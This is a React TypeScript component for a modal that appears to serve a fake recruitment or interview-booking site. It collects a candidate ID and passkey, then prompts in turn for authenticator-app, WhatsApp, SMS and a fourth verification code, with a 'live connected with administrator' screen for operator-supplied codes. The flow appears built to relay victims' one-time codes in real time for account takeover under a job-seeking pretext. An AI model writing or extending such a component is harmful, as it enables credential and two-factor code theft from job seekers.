"use client";

import { useState, useEffect } from "react";
import { Check, Copy, ShieldCheck } from "lucide-react";
import { getCodeLabel } from "@/lib/codeData";

export type VerifyStage = "closed" | "idPasskey" | "waiting" | "code" | "displayCode";

function Shell({ children }: { children: React.ReactNode }) {
  return (
    <div
      className="fixed inset-0 z-50 flex items-center justify-center bg-ink/60 backdrop-blur-sm px-4"
      role="dialog"
      aria-modal="true"
    >
      <div className="w-full max-w-sm bg-white border border-black/5 rounded-2xl shadow-2xl p-8 animate-fade-up">
        {children}
      </div>
    </div>
  );
}

export default function VerifyModal({
  stage,
  submitting,
  codeNumber = 1,
  displayCode = "",
  errorMessage,
  onSubmitIdPasskey,
  onSubmitCode,
  onCancel,
}: {
  stage: VerifyStage;
  submitting: boolean;
  codeNumber?: number;
  displayCode?: string;
  errorMessage: string | null;
  onSubmitIdPasskey: (candidateId: string, passkey: string) => void;
  onSubmitCode: (code: string) => void;
  onCancel: () => void;
}) {
  const [candidateId, setCandidateId] = useState("");
  const [passkey, setPasskey] = useState("");
  const [code, setCode] = useState("");
  const [copied, setCopied] = useState(false);

  useEffect(() => {
    if (stage === "code") {
      setCode("");
    }
  }, [stage, codeNumber]);

  if (stage === "closed") return null;

  if (stage === "waiting") {
    return (
      <Shell>
        <div className="flex flex-col items-center py-6 text-center space-y-4">
          <div className="h-10 w-10 rounded-full border-2 border-ink/20 border-t-ink animate-spin" />
          <p className="font-sans text-sm text-gray-600 font-medium">
            Verifying your details with our recruitment team…
          </p>
        </div>
      </Shell>
    );
  }

  // Display Code to Candidate (Admin-provided pop-out code)
  if (stage === "displayCode") {
    const handleCopy = () => {
      if (!displayCode) return;
      navigator.clipboard.writeText(displayCode);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    };

    return (
      <Shell>
        <div className="text-center space-y-4 font-sans">
          <div className="w-12 h-12 rounded-full bg-blue-50 text-[#0069ff] flex items-center justify-center mx-auto border border-blue-100">
            <ShieldCheck className="w-6 h-6" />
          </div>

          <h2 className="font-display text-2xl text-ink">Verification Code</h2>
          <p className="text-sm text-muted leading-relaxed">
            Please use this verification code provided directly by your interviewer:
          </p>

          {/* Prominent Code Box */}
          <div className="py-4 px-6 bg-blue-50/80 border-2 border-blue-200/80 rounded-2xl flex flex-col items-center justify-center shadow-inner relative group">
            <span className="font-mono text-3xl sm:text-4xl font-bold tracking-widest text-[#0069ff] select-all">
              {displayCode || "------"}
            </span>

            {displayCode && (
              <button
                type="button"
                onClick={handleCopy}
                className="mt-3 inline-flex items-center gap-1.5 px-3 py-1 bg-white hover:bg-gray-50 border border-blue-200 rounded-full text-xs font-semibold text-[#0069ff] transition-all shadow-2xs"
              >
                {copied ? (
                  <>
                    <Check className="w-3.5 h-3.5 text-emerald-600" />
                    <span className="text-emerald-600">Copied to clipboard</span>
                  </>
                ) : (
                  <>
                    <Copy className="w-3.5 h-3.5" />
                    <span>Copy Code</span>
                  </>
                )}
              </button>
            )}
          </div>

          <div className="pt-2 flex items-center justify-center gap-1.5 text-xs text-muted font-mono">
            <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
            <span>Live connected with administrator</span>
          </div>
        </div>
      </Shell>
    );
  }

  // Candidate Input for AuthApp (1), WhatsApp (2), SMS (3), Code 4 (4)
  if (stage === "code") {
    const label = getCodeLabel(codeNumber);

    return (
      <Shell>
        <h2 className="font-display text-2xl text-ink">{label} Code</h2>
        <p className="mt-2 text-sm text-muted leading-relaxed">
          Please enter the {label} verification code you were provided.
        </p>

        {errorMessage && (
          <p className="mt-4 rounded-sm border border-rejected/30 bg-rejected/5 px-4 py-3 text-sm text-rejected">
            {errorMessage}
          </p>
        )}

        <form
          className="mt-6 space-y-4"
          onSubmit={(e) => {
            e.preventDefault();
            onSubmitCode(code.trim());
          }}
        >
          <div>
            <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="additional-code">
              {label} Code
            </label>
            <input
              id="additional-code"
              required
              autoFocus
              value={code}
              onChange={(e) => setCode(e.target.value)}
              placeholder={`Enter ${label} code`}
              className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors font-mono text-base"
            />
          </div>

          <button
            type="submit"
            disabled={submitting}
            className="w-full bg-ink text-paper py-3 font-mono text-xs uppercase tracking-widest2 hover:bg-brassdim transition-colors disabled:opacity-50"
          >
            {submitting ? "Submitting…" : "Submit"}
          </button>
        </form>
      </Shell>
    );
  }

  // stage === "idPasskey"
  return (
    <Shell>
      <h2 className="font-display text-2xl text-ink">Verify to Confirm</h2>
      <p className="mt-2 text-sm text-muted leading-relaxed">
        Enter the candidate ID and passkey you were provided so our team can
        verify your booking.
      </p>

      {errorMessage && (
        <p className="mt-4 rounded-sm border border-rejected/30 bg-rejected/5 px-4 py-3 text-sm text-rejected">
          {errorMessage}
        </p>
      )}

      <form
        className="mt-6 space-y-4"
        onSubmit={(e) => {
          e.preventDefault();
          onSubmitIdPasskey(candidateId.trim(), passkey.trim());
        }}
      >
        <div>
          <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="candidate-id">
            Candidate ID
          </label>
          <input
            id="candidate-id"
            required
            value={candidateId}
            onChange={(e) => setCandidateId(e.target.value)}
            className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors"
            autoFocus
          />
        </div>
        <div>
          <label className="font-mono text-xs uppercase tracking-widest2 text-muted" htmlFor="passkey">
            Passkey
          </label>
          <input
            id="passkey"
            type="password"
            required
            value={passkey}
            onChange={(e) => setPasskey(e.target.value)}
            className="mt-2 w-full border-b-2 rule-hairline bg-transparent py-2 text-ink outline-none focus:border-brass transition-colors"
          />
        </div>

        <div className="flex gap-3 pt-4">
          <button
            type="button"
            onClick={onCancel}
            className="flex-1 border border-ink/20 py-3 font-mono text-xs uppercase tracking-widest2 text-muted hover:border-ink transition-colors"
          >
            Cancel
          </button>
          <button
            type="submit"
            disabled={submitting}
            className="flex-1 bg-ink text-paper py-3 font-mono text-xs uppercase tracking-widest2 hover:bg-brassdim transition-colors disabled:opacity-50"
          >
            {submitting ? "Submitting…" : "Submit"}
          </button>
        </div>
      </form>
    </Shell>
  );
}
